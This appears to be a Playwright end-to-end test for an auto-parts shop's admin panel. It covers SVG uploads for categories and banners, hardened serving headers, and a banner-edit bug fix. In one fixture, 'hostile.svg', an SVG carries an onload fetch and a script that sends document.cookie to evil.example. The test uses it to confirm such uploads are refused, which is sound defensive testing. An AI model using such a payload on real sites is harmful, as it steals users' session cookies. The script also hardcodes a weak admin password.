// Vector uploads, end to end, and the banner edit that used to lose its image.
//
// Two separate things the shop asked for, tested together because they are the
// same screen: an admin can now hand a category, a brand or a banner an SVG
// and have it render sharp at every size, and editing a banner no longer
// demands the picture back before it will save a title change.
//
// The security half is not incidental. SVG is the only upload here that is a
// document rather than a picture, and it is served from the shop's own origin,
// so "the admin uploaded it" is not on its own a reason to trust it. The
// checks below are the ones that would catch it if that ever stopped holding.
import { chromium } from "playwright";
import { PrismaClient } from "@prisma/client";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { waitForAdmin } from "./lib/wait-for-admin.mjs";

const BASE = process.env.BASE_URL || "http://localhost:3000";
const prisma = new PrismaClient();

// Written here rather than kept as files on disk. Both are a few hundred bytes
// of text, and one of them is a working XSS payload — it should exist for the
// seconds this suite needs it and nowhere else, least of all sitting in the
// repository looking like artwork somebody could upload by mistake.
const PICS = mkdtempSync(join(tmpdir(), "svg-fixtures-"));

// A plain icon, dressed the way an editor exports one: XML declaration, a
// generator comment, and a pixel size with no viewBox.
writeFileSync(
  join(PICS, "brake-icon.svg"),
  `<?xml version="1.0" encoding="UTF-8"?>
<!-- Generator: test fixture -->
<svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="none" stroke="#0b1b3a" stroke-width="2">
  <circle cx="24" cy="24" r="15"/>
  <circle cx="24" cy="24" r="5"/>
  <path d="M35 13l5-3M38 20l6-2M38 28l6 2M35 35l5 3"/>
</svg>
`,
);

// The same icon with two ways to run script on this origin bolted onto it.
writeFileSync(
  join(PICS, "hostile.svg"),
  `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" onload="fetch('/admin/parametres')">
  <script>document.location='https://evil.example/'+document.cookie</script>
  <circle cx="24" cy="24" r="20" fill="red"/>
</svg>
`,
);

let pass = 0, fail = 0;
const check = (label, ok, detail = "") => {
  ok ? pass++ : fail++;
  console.log(`  ${ok ? "PASS" : "FAIL"}  ${label}${detail ? ` — ${detail}` : ""}`);
};

const browser = await chromium.launch({ executablePath: "/opt/pw-browsers/chromium" });
const ctx = await browser.newContext({ viewport: { width: 1280, height: 1000 } });
const admin = await ctx.newPage();
admin.on("pageerror", (e) => console.log("  PAGE ERROR:", e.message));

await admin.goto(`${BASE}/compte`);
await admin.fill('input[name="email"]', "admin@automotive-pieces-auto.tn");
await admin.fill('input[name="password"]', "admin1234");
await admin.getByRole("button", { name: "Se connecter", exact: true }).click();
await waitForAdmin(admin, BASE);

// Everything this run creates or changes, put back at the end. The shop's own
// catalogue is live data; a test that leaves an icon on a real family has
// edited the storefront, not tested it.
const family = await prisma.category.findFirst({
  where: { parentId: null },
  orderBy: { order: "asc" },
  select: { id: true, name: true, slug: true, imageUrl: true },
});
const familyImageBefore = family.imageUrl;
const createdAssetIds = [];
let createdPromoId = null;

/* ------------------------------------------------------------------ */
console.log("\n[1] A CATEGORY TAKES AN SVG");
{
  await admin.goto(`${BASE}/admin/catalogue`);
  await admin.waitForTimeout(600);
  const row = admin.locator("li", { hasText: family.name }).first();
  await row.getByLabel("Modifier").click();
  await admin.waitForTimeout(300);
  const form = row.locator("form").first();
  await form.locator('input[type="file"]').setInputFiles(`${PICS}/brake-icon.svg`);
  await form.getByRole("button", { name: "Enregistrer" }).click();
  await admin.waitForTimeout(1500);

  const after = await prisma.category.findUnique({
    where: { id: family.id },
    select: { imageUrl: true },
  });
  const url = after?.imageUrl || "";
  check("the SVG was accepted and stored", url.startsWith("/api/images/"), url || "nothing stored");
  // The suffix is what tells next/image to serve the file as-is instead of
  // sending it to the optimiser, which answers 400 for SVG. Without it the
  // upload succeeds and every tile shows a broken image.
  check("its URL carries the .svg suffix", url.endsWith(".svg"), url);

  const assetId = url.replace("/api/images/", "").replace(/\.svg$/, "");
  createdAssetIds.push(assetId);
  const asset = await prisma.mediaAsset.findUnique({
    where: { id: assetId },
    select: { mimeType: true, data: true },
  });
  check("stored as image/svg+xml", asset?.mimeType === "image/svg+xml", asset?.mimeType);

  const stored = Buffer.from(asset.data).toString("utf8");
  check("the drawing survived the upload", stored.includes("<circle"), stored.slice(0, 60));
  check("a viewBox was added from its width/height", stored.includes('viewBox="0 0 48 48"'), stored.slice(0, 140));
  check("the fixed pixel size was dropped", !/<svg[^>]*\swidth=/i.test(stored), stored.slice(0, 140));
  check("the XML declaration and comment were stripped", !stored.includes("<?xml") && !stored.includes("Generator"));
}

/* ------------------------------------------------------------------ */
console.log("\n[2] IT IS SERVED AS AN IMAGE AND NOTHING ELSE");
{
  const cat = await prisma.category.findUnique({ where: { id: family.id }, select: { imageUrl: true } });
  const res = await admin.request.get(`${BASE}${cat.imageUrl}`);
  check("the file is served", res.status() === 200, `HTTP ${res.status()}`);
  check("with the SVG content type", (res.headers()["content-type"] || "").includes("image/svg+xml"), res.headers()["content-type"]);

  // This route is excluded from the proxy matcher, so it carries no policy
  // unless it sets one itself. Typed into the address bar an SVG is a document
  // on this origin, and a document can run script.
  const csp = res.headers()["content-security-policy"] || "";
  check("it carries its own lockdown CSP", csp.includes("default-src 'none'"), csp || "(none)");
  check("the CSP sandboxes it", csp.includes("sandbox"), csp);
  check("nosniff is on it too", (res.headers()["x-content-type-options"] || "") === "nosniff");

  // The suffix is addressing, not identity: the same bytes answer either way,
  // so an older stored URL without it keeps working.
  const bare = await admin.request.get(`${BASE}${cat.imageUrl.replace(/\.svg$/, "")}`);
  check("the same id resolves without the suffix", bare.status() === 200, `HTTP ${bare.status()}`);
}

/* ------------------------------------------------------------------ */
console.log("\n[3] THE SHOPPER SEES IT ON THE TILE");
{
  const shopper = await (await browser.newContext({ viewport: { width: 1280, height: 900 } })).newPage();
  const broken = [];
  shopper.on("response", (r) => { if (r.status() >= 400 && r.url().includes("/api/images/")) broken.push(r.url()); });
  await shopper.goto(`${BASE}/`, { waitUntil: "networkidle" });

  const tile = shopper.locator("button", { hasText: family.name }).first();
  const img = tile.locator("img").first();
  check("the family tile renders the uploaded icon", await img.count() > 0);
  const src = await img.getAttribute("src");
  // If this went through /_next/image the optimiser would have refused it.
  check("served straight, not through the optimiser", !!src && !src.includes("/_next/image"), src);
  check("nothing under /api/images failed to load", broken.length === 0, broken.join(", "));

  const box = await img.boundingBox();
  check("it is drawn at a real size", !!box && box.width > 20 && box.height > 20, box ? `${Math.round(box.width)}x${Math.round(box.height)}` : "no box");

  // A vector is one file at every breakpoint — that is the reason to accept
  // one — so the phone must get the same source, at a size that suits it.
  await shopper.setViewportSize({ width: 390, height: 844 });
  await shopper.waitForTimeout(400);
  const phoneSrc = await img.getAttribute("src");
  check("the phone gets the same single file", phoneSrc === src, `${phoneSrc} vs ${src}`);
  const phoneBox = await img.boundingBox();
  check("and it still fits inside its tile", !!phoneBox && phoneBox.width > 20 && phoneBox.width < 200, phoneBox ? `${Math.round(phoneBox.width)}px` : "no box");
  await shopper.context().close();
}

/* ------------------------------------------------------------------ */
console.log("\n[4] AN SVG THAT CAN RUN SCRIPT IS REFUSED");
{
  await admin.goto(`${BASE}/admin/catalogue`);
  await admin.waitForTimeout(600);
  const row = admin.locator("li", { hasText: family.name }).first();
  await row.getByLabel("Modifier").click();
  await admin.waitForTimeout(300);
  const form = row.locator("form").first();
  await form.locator('input[type="file"]').setInputFiles(`${PICS}/hostile.svg`);
  await form.getByRole("button", { name: "Enregistrer" }).click();
  await admin.waitForTimeout(1500);

  const after = await prisma.category.findUnique({ where: { id: family.id }, select: { imageUrl: true } });
  check("the hostile file did not replace the icon", after.imageUrl.endsWith(".svg") && after.imageUrl.includes(createdAssetIds[0]), after.imageUrl);

  const stored = await prisma.mediaAsset.findMany({ select: { data: true, mimeType: true } });
  const anyScript = stored.some((a) =>
    a.mimeType === "image/svg+xml" && /<script|onload\s*=/i.test(Buffer.from(a.data).toString("utf8")));
  check("nothing executable reached the database", !anyScript);

  const msg = await admin.locator("text=/refusé|onload|script/i").count();
  check("the admin is told why it was refused", msg > 0);
}

/* ------------------------------------------------------------------ */
console.log("\n[5] A PRODUCT PHOTO IS STILL A PHOTOGRAPH");
{
  // SVG is opt-in per call site. A part photo has nothing to gain from a
  // vector and every reason not to accept a format with an element tree.
  const product = await prisma.product.findFirst({ select: { id: true, slug: true } });
  await admin.goto(`${BASE}/admin/stock/${product.id}`);
  await admin.waitForTimeout(800);
  const accept = await admin.locator('input[type="file"]').first().getAttribute("accept");
  check("the photo input does not offer SVG", !!accept && !accept.includes("svg"), accept);
}

/* ------------------------------------------------------------------ */
console.log("\n[6] EDITING A BANNER NO LONGER DEMANDS ITS PICTURE BACK");
{
  await admin.goto(`${BASE}/admin/promotions`);
  await admin.waitForTimeout(800);

  // Create one the way the shop does: upload artwork, so its stored URL is
  // /api/images/<id> — the shape the path box deliberately cannot show.
  const addForm = admin.locator("form").filter({ has: admin.locator('input[name="title"]') }).first();
  await addForm.locator('input[name="title"]').fill("Bannière test SVG");
  await addForm.locator('input[type="file"]').setInputFiles(`${PICS}/brake-icon.svg`);
  await addForm.getByRole("button", { name: /Ajouter la bannière/i }).click();
  await admin.waitForTimeout(1800);

  const promo = await prisma.promotion.findFirst({
    where: { title: "Bannière test SVG" },
    select: { id: true, imageUrl: true },
  });
  check("the banner was created", !!promo);
  createdPromoId = promo.id;
  createdAssetIds.push(promo.imageUrl.replace("/api/images/", "").replace(/\.svg$/, ""));
  check("its artwork is an uploaded SVG", promo.imageUrl.endsWith(".svg"), promo.imageUrl);

  // The reported bug: open it, change only the title, save. The picture is not
  // in the form — an uploaded one has no /images/ path to show — so the action
  // saw no image at all and answered "Choisissez une image (fichier ou
  // chemin)", which made every field on an uploaded banner uneditable.
  await admin.reload();
  await admin.waitForTimeout(1200);
  const card = admin.locator(`[data-promo="${createdPromoId}"]`);
  check("the banner is listed in the admin", await card.count() === 1);
  await card.getByRole("button", { name: "Modifier", exact: true }).click();
  await admin.waitForTimeout(500);

  const editForm = card.locator("form");
  check("the edit form is open", await editForm.count() > 0);
  check(
    "it says the artwork is an upload it will keep",
    await editForm.getByText(/image téléversée/i).count() > 0,
  );
  // The path box is empty because an uploaded picture has no /images/ path,
  // which is exactly the condition that used to break the save.
  check("the path box is empty, as it has to be", (await editForm.locator('input[name="imageUrl"]').inputValue()) === "");

  await editForm.locator('input[name="title"]').fill("Bannière test SVG renommée");
  await editForm.getByRole("button", { name: "Enregistrer", exact: true }).click();
  await admin.waitForTimeout(2000);

  const complaint = await admin.getByText(/Choisissez une image/i).count();
  check("it does not ask for the picture again", complaint === 0);

  const saved = await prisma.promotion.findUnique({
    where: { id: createdPromoId },
    select: { title: true, imageUrl: true },
  });
  check("the new title was saved", saved.title === "Bannière test SVG renommée", saved.title);
  check("and the artwork is untouched", saved.imageUrl === promo.imageUrl, `${promo.imageUrl} -> ${saved.imageUrl}`);

  const stillThere = await prisma.mediaAsset.count({
    where: { id: promo.imageUrl.replace("/api/images/", "").replace(/\.svg$/, "") },
  });
  check("its bytes were not swept up as orphaned", stillThere === 1);
}

/* ------------------------------------------------------------------ */
console.log("\n[7] PUTTING THE SHOP BACK");
{
  if (createdPromoId) await prisma.promotion.deleteMany({ where: { id: createdPromoId } });
  await prisma.category.update({ where: { id: family.id }, data: { imageUrl: familyImageBefore } });
  await prisma.mediaAsset.deleteMany({ where: { id: { in: createdAssetIds } } });

  const restored = await prisma.category.findUnique({ where: { id: family.id }, select: { imageUrl: true } });
  check("the family's picture is back as it was", restored.imageUrl === familyImageBefore, String(restored.imageUrl));
  const leftovers = await prisma.mediaAsset.count({ where: { id: { in: createdAssetIds } } });
  check("no test artwork left in the database", leftovers === 0, `${leftovers} left`);
  const promoLeft = await prisma.promotion.count({ where: { title: { contains: "Bannière test SVG" } } });
  check("no test banner left", promoLeft === 0, `${promoLeft} left`);
}

console.log(`\n${pass} passed, ${fail} failed`);
await browser.close();
await prisma.$disconnect();
process.exit(fail ? 1 : 0);
